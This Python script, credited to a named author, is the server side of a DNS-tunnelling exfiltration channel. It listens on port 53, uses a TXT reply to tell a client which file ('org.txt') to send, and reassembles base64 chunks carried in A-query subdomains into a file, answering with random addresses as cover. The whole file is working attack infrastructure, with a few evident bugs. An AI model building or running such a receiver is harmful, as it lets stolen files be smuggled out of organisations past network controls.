__author__ = "Adel Tchernitsky"


from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, A, TXT
import base64
import threading
import random


ADDRESS = "0.0.0.0"
PORT = 53
TTL = 60
MSG_TYPE = "A"
FILE_REQUEST_INDICATOR = "-"
FILE_CONTENT_INDICATOR = "_"
FINAL_MESSAGE = "end"
REQUEST_FILE = b"org.txt"


collected_data = []
data_lock = threading.Lock()
write = False
file_name = ""


def get_random_response():
    if MSG_TYPE == "A":
        parts = [str(random.randint(0, 256)) for i in range(4)]
        return ".".join(parts)


class SimpleResolver(BaseResolver):
    def resolve(self, request, handler):
        global write
        print("in resolve")

        # Get the full domain name requested
        query_name = request.q.qname
        domain = str(query_name).rstrip(".")  # Removes the last dot

        # Get client's message
        data = domain.replace(".", "")
        print(data)

        reply = request.reply()
        if request.q.qtype == 16:  # "TXT"
            global file_name
            file_name = REQUEST_FILE
            reply.add_answer(RR(query_name, QTYPE.A, rdata=TXT(file_name), ttl=TTL))
            print(reply)
            return reply

        elif request.q.qtype == 1:  # "A"
            if FINAL_MESSAGE in data:
                data = data.replace(FINAL_MESSAGE, "==")  # When encoded using base64
                write = True  # After receiving 'end' should write into file

            decoded = base64.b64decode(data)
            print(f"Client sent: {decoded}")

            # Store safely
            with data_lock:
                collected_data.append(decoded)

        # Prepare response
        reply.add_answer(RR(query_name, QTYPE.A, rdata=A(get_random_response()), ttl=TTL))
        return reply


def change_file_name():
    global file_name
    new_name = input("Enter file name: ")
    if new_name != "":
        file_name = new_name


def back_into_file():
    global write
    global collected_data
    
    if not write:
        return

    with data_lock:
        byte_data = b"".join(collected_data)

    with open(file_name, "wb") as f:
        f.write(byte_data)

    write = False
    collected_data = []


def main():
    print("Starting DNS server on (0.0.0.0:53)")
    server = DNSServer(SimpleResolver(), address=ADDRESS, port=PORT)
    server_thread = threading.Thread(target=server.start, daemon=True)
    server_thread.start()

    while True:
        try:
            back_into_file()
        except KeyboardInterrupt:
            return


if __name__ == "__main__":
    main()
